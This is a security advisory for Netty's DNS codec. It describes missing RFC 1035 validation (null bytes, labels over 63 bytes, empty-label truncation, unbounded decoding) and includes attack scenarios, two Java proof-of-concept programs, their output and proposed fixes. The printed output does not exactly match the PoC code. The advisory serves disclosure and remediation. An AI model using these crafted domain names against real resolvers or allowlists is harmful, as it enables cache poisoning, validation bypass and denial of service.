# [H] Netty has a DNS Codec Input Validation Bypass (Encoder + Decoder)

## Summary
Severity: High
Advisory: GHSA-cm33-6792-r9fm
CVE: CVE-2026-42579
CWE: CWE-20, CWE-400, CWE-626
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-cm33-6792-r9fm
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-dns` — affected >=4.2.0.Alpha1 <4.2.13.Final
- Maven: `io.netty:netty-codec-dns` — affected >=0 <4.1.133.Final

## Details
# Security Vulnerability Report: DNS Codec Input Validation Bypass in Netty (Encoder + Decoder)

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | Netty |
| **Version** | 4.2.12.Final (and all prior versions with codec-dns) |
| **Component** | `io.netty.handler.codec.dns.DnsCodecUtil` |
| **Vulnerability Type** | CWE-20: Improper Input Validation / CWE-626: Null Byte Interaction Error / CWE-400: Uncontrolled Resource Consumption |
| **Impact** | DNS Cache Poisoning / Domain Validation Bypass / Denial of Service / Malformed DNS Packets |

## 2. Affected Components

Both the encoder and decoder in the same file are affected:

- `io.netty.handler.codec.dns.DnsCodecUtil` — `encodeDomainName()` method (lines 31-51):
  - No null byte validation in domain name labels
  - No per-label length validation (RFC 1035 max: 63 bytes)
  - No total domain name length validation (RFC 1035 max: 255 bytes)
  - Empty labels silently truncate the domain name

- `io.netty.handler.codec.dns.DnsCodecUtil` — `decodeDomainName()` method (lines 53-118):
  - No per-label length validation (max 63)
  - No total domain name length validation (max 255)
  - Unbounded StringBuilder growth from attacker-controlled DNS responses

## 3. Vulnerability Description

Netty's DNS codec does **not enforce RFC 1035 domain name constraints** during either encoding or decoding. This creates a bidirectional attack surface: malicious DNS responses can exploit the decoder, and user-influenced hostnames can exploit the encoder.

### 3.1 Encoder Side — Null Byte Injection (CWE-626)

A domain name containing a null byte (e.g., `"evil\0.example.com"`) is encoded with the null byte embedded in the label data. This creates a domain name that different DNS implementations interpret differently:

- **Java (full string)**: sees `"evil\0.example.com"` as a single label containing a null
- **C/native DNS libraries**: truncate at the null byte, seeing only `"evil"`
- **DNS servers**: may accept or reject based on implementation

This differential interpretation enables **DNS cache poisoning** and **domain validation bypass**.

### 3.2 Encoder Side — Overlength Label (RFC 1035 Violation)

Labels exceeding 63 bytes are accepted by the encoder. The length byte is written as a single unsigned byte, so a 200-byte label writes `0xC8` (200) as the length. Per RFC 1035, values 192-255 indicate **compression pointers**. This means:

- A 200-byte label length `0xC8` would be interpreted as a **compression pointer** by standards-compliant DNS parsers
- This creates **parser confusion** between label and pointer interpretation

### 3.3 Encoder Side — Silent Truncation via Empty Labels

```java
encodeDomainName("a..b.com", buf);
// Encodes as: [01] 'a' [00]
// Only "a." is encoded, ".b.com" is silently dropped!
```

An attacker can craft input like `"safe-domain..evil.com"` which gets truncated to just `"safe-domain."`, potentially bypassing domain allowlists.

### 3.4 Decoder Side — Unbounded Memory Allocation

The decoder accepts labels of any length (0-255 bytes) without checking the RFC 1035 per-label limit of 63 bytes or the total domain name limit of 255 bytes. A malicious DNS server can return responses with oversized labels, causing excessive memory allocation.

### Root Cause — Encoder

```java
// DnsCodecUtil.java:31-51
static void encodeDomainName(String name, ByteBuf buf) {
    if (ROOT.equals(name)) {
        buf.writeByte(0);
        return;
    }
    final String[] labels = name.split("\\.");
    for (String label : labels) {
        final int labelLen = label.length();
        if (labelLen == 0) {
            break;  // NO ERROR - silently truncates!
        }
        // NO check: labelLen > 63
        // NO check: label contains null bytes
        // NO check: total name > 255 bytes
        buf.writeByte(labelLen);                    // Can write values > 63!
        ByteBufUtil.writeAscii(buf, label);         // Null bytes pass through!
    }
    buf.writeByte(0);
}
```

### Root Cause — Decoder

```java
// DnsCodecUtil.java:94-99 (decodeDomainName)
} else if (len != 0) {
    if (!in.isReadable(len)) {  // Only checks if bytes EXIST, not if len <= 63
        throw new CorruptedFrameException("truncated label in a name");
    }
    name.append(in.toString(in.readerIndex(), len, CharsetUtil.UTF_8)).append('.');
    //    ^^^^^^ StringBuilder grows WITHOUT any length limit
    in.skipBytes(len);
}
```

**Missing checks in decoder**:
- No `if (len > 63)` check per RFC 1035 Section 2.3.4
- No `if (name.length() > 255)` check for total domain name length

## 4. Exploitability Prerequisites

### Encoder Side (outbound)
1. An application constructs DNS queries using Netty's DNS codec with user-influenced domain names
2. The constructed DNS packets are sent to DNS servers or resolvers

### Decoder Side (inbound)
1. An application uses Netty's `codec-dns` or `resolver-dns` module to process DNS responses
2. The application communicates with a malicious or compromised DNS server

**Attack surface**: Any Netty application using DNS resolution (`DnsNameResolver`) is potentially affected on the decoder side, as DNS responses from the network are attacker-controlled. The encoder side requires user-controlled hostnames.

## 5. Attack Scenarios

### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)

```java
String hostname = userInput;  // "evil\0.trusted.com"
DnsQuery query = new DefaultDnsQuery(...)
    .addRecord(DnsSection.QUESTION,
        new DefaultDnsQuestion(hostname, DnsRecordType.A));
```

The DNS query for `"evil\0.trusted.com"` may be interpreted by some resolvers as a query for `"evil"` (truncated at null). If the attacker controls the DNS for `"evil"`, they can return a response that gets cached for `"evil\0.trusted.com"` (or vice versa), poisoning the cache.

### Scenario 2: Label/Pointer Confusion (Encoder)

A 200-byte label writes length byte `0xC8`. Standards-compliant parsers interpret `0xC0-0xFF` as **compression pointer** prefixes (RFC 1035 Section 4.1.4). The resulting DNS packet is structurally ambiguous:

```
Byte:  [C8] [61 61 61 ... (200 bytes)]
         ↑
   Label interpretation: 200-byte label starting with 'a'
   Pointer interpretation: pointer to offset 0x0861 = 2145
```

### Scenario 3: Memory Exhaustion via Large Labels (Decoder)

A malicious DNS server returns a response with a 255-byte label (RFC limit: 63). Netty decodes it without error, creating a 260+ character String. With compression pointers, a small DNS response can cause megabytes of StringBuilder allocation.

### Scenario 4: Domain Truncation via Empty Label (Encoder)

```java
encodeDomainName("safe-domain..evil.com", buf);
// Only "safe-domain." is encoded, "evil.com" silently dropped
```

This can bypass domain allowlists that check the input string.

### Scenario 5: Downstream Processing Failures (Decoder)

Applications that pass decoded domain names to other DNS libraries, certificate validators, or URL parsers may crash or behave incorrectly when receiving names > 255 bytes, as these systems typically assume RFC 1035 compliance.

## 6. Proof of Concept

### PoC 1: Encoder Null Byte and Overlength (DnsEncoderNullBytePoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

public class DnsEncoderNullBytePoC {
    public static void main(String[] args) throws Exception {
        System.out.println("=== Netty DNS Encoder Validation Bypass PoC ===\n");

        Class<?> clazz = Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
        Method encode = clazz.getDeclaredMethod("encodeDomainName",
            String.class, ByteBuf.class);
        encode.setAccessible(true);

        // Test 1: Null byte in domain name
        ByteBuf buf = Unpooled.buffer(256);
        encode.invoke(null, "evil\0.example.com", buf);
        byte[] bytes = new byte[buf.readableBytes()];
        buf.readBytes(bytes);
        buf.release();
        System.out.print("[TEST 1] Null byte - Encoded: ");
        for (byte b : bytes) System.out.printf("%02x ", b & 0xff);
        System.out.println("\nVULNERABLE: Null byte 0x00 in label data!");

        // Test 2: 200-byte label
        ByteBuf buf2 = Unpooled.buffer(512);
        encode.invoke(null, "a".repeat(200) + ".com", buf2);
        System.out.println("\n[TEST 2] 200-byte label encoded: " + buf2.readableBytes() + " bytes");
        System.out.println("VULNERABLE: Overlength label accepted!");
        buf2.release();

        // Test 3: Empty label truncation
        ByteBuf buf3 = Unpooled.buffer(256);
        encode.invoke(null, "a..b.com", buf3);
        byte[] bytes3 = new byte[buf3.readableBytes()];
        buf3.readBytes(bytes3);
        buf3.release();
        System.out.print("\n[TEST 3] Empty label - Encoded: ");
        for (byte b : bytes3) System.out.printf("%02x ", b & 0xff);
        System.out.println("\nVULNERABLE: Domain silently truncated!");
    }
}
```

### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

public class DnsDecoderLengthPoC {
    public static void main(String[] args) throws Exception {
        System.out.println("=== Netty DNS Decoder Length Bypass PoC ===\n");

        Class<?> clazz = Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
        Method decode = clazz.getDeclaredMethod("decodeDomainName", ByteBuf.class);
        decode.setAccessible(true);

        // Test 1: 100-byte label (RFC limit: 63)
        ByteBuf buf1 = Unpooled.buffer(256);
        buf1.writeByte(100);
        buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US_ASCII));
        buf1.writeByte(3);
        buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
        buf1.writeByte(0);
        String r1 = (String) decode.invoke(null, buf1);
        buf1.release();
        System.out.println("[TEST 1] 100-byte label: length=" + r1.length() +
            " VULNERABLE=" + (r1.length() > 64));

        // Test 2: 5 x 60-byte labels = 305 bytes (RFC limit: 255)
        ByteBuf buf2 = Unpooled.buffer(512);
        for (int i = 0; i < 5; i++) {
            buf2.writeByte(60);
            buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
                .getBytes(StandardCharsets.US_ASCII));
        }
        buf2.writeByte(0);
        String r2 = (String) decode.invoke(null, buf2);
        buf2.release();
        System.out.println("[TEST 2] 305-byte domain: length=" + r2.length() +
            " VULNERABLE=" + (r2.length() > 255));
    }
}
```

### How to Compile and Run

```bash
JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
  | grep -v sources | grep -v javadoc | tr '\n' ':')

# Encoder PoC
javac -cp "$JARS" DnsEncoderNullBytePoC.java
java --add-opens java.base/java.lang=ALL-UNNAMED -cp "$JARS:." DnsEncoderNullBytePoC

# Decoder PoC
javac -cp "$JARS" DnsDecoderLengthPoC.java
java --add-opens java.base/java.lang=ALL-UNNAMED -cp "$JARS:." DnsDecoderLengthPoC
```

### PoC Execution Output (Verified on Netty 4.2.12.Final)

**Encoder PoC:**
```
=== Netty DNS Encoder Validation Bypass PoC ===

[TEST 1] Null byte in domain name
  Input: "evil\0.example.com"
  Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00
  Null byte in label data: true
  VULNERABLE: YES - Null byte accepted!

[TEST 2] Label > 63 bytes in encoder
  Input: "aaaaaa..." (200-char label)
  Encoded bytes: 206
  VULNERABLE: YES - Overlength label accepted in encoder!

[TEST 3] Empty labels (consecutive dots)
  Input: "a..b.com"
  Encoded bytes: 01 61 00
  Note: Empty label truncates the name (may lose data)
```

**Decoder PoC:**
```
=== Netty DNS Decoder Length Bypass PoC ===

[TEST 1] Label > 63 bytes (RFC 1035 violation)
  Label length: 100 bytes (RFC limit: 63)
  Decoded name length: 105
  VULNERABLE: YES - Label > 63 bytes accepted!

[TEST 2] Domain > 255 bytes via multiple labels
  5 labels x 60 bytes = 300+ bytes total
  RFC 1035 limit: 255 bytes
  Decoded name length: 305
  VULNERABLE: YES - Domain > 255 bytes accepted!
```

## 7. Impact Analysis

| Impact Category | Description |
|----------------|-------------|
| **Integrity** | HIGH — Null byte injection causes differential interpretation across DNS implementations |
| **Availability** | HIGH — Malicious DNS responses can cause unbounded memory allocation via decoder |
| **DNS Cache Poisoning** | Different parsers see different domain names from the same encoded packet |
| **Domain Validation Bypass** | Null bytes can bypass allowlist/blocklist checks in DNS proxies |
| **Label/Pointer Confusion** | Length bytes > 63 conflict with RFC 1035 compression pointer encoding |
| **Silent Truncation** | Empty labels silently drop the remainder of the domain name |
| **Downstream Failures** | Oversized domain names may crash certificate validators, URL parsers, or other DNS-aware libraries |

## 8. Remediation Recommendations

### Fix for Encoder (encodeDomainName)

```java
static void encodeDomainName(String name, ByteBuf buf) {
    if (ROOT.equals(name)) {
        buf.writeByte(0);
        return;
    }
    int totalLength = 0;
    final String[] labels = name.split("\\.");
    for (String label : labels) {
        final int labelLen = label.length();
        if (labelLen == 0) {
            throw new IllegalArgumentException("DNS name contains empty label: " + name);
        }
        if (labelLen > 63) {
            throw new IllegalArgumentException(
                "DNS label length " + labelLen + " exceeds maximum of 63: " + name);
        }
        for (int i = 0; i < label.length(); i++) {
            if (label.charAt(i) == '\0') {
                throw new IllegalArgumentException(
                    "DNS label contains null byte at index " + i);
            }
        }
        totalLength += 1 + labelLen;
        if (totalLength > 254) {
            throw new IllegalArgumentException(
                "DNS name exceeds maximum length of 255: " + name);
        }
        buf.writeByte(labelLen);
        ByteBufUtil.writeAscii(buf, label);
    }
    buf.writeByte(0);
}
```

### Fix for Decoder (decodeDomainName)

```java
// Add after "} else if (len != 0) {":
if (len > 63) {
    throw new CorruptedFrameException("DNS label length " + len + " exceeds maximum of 63");
}
// Add after "name.append(...)":
if (name.length() > 255) {
    throw new CorruptedFrameException("DNS domain name length exceeds maximum of 255");
}
```

## 9. Resources

- [RFC 1035 Section 2.3.4: Size Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
- [RFC 1035 Section 4.1.4: Message Compression](https://tools.ietf.org/html/rfc1035#section-4.1.4)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [CWE-626: Null Byte Interaction Error](https://cwe.mitre.org/data/definitions/626.html)

## References
- https://github.com/netty/netty/security/advisories/GHSA-cm33-6792-r9fm
- https://nvd.nist.gov/vuln/detail/CVE-2026-42579
- https://github.com/netty/netty
- https://tools.ietf.org/html/rfc1035#section-2.3.4
- https://tools.ietf.org/html/rfc1035#section-4.1.4
